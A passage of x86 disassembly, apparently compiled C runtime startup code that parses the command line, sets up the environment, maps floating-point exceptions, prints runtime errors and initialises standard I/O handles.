  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
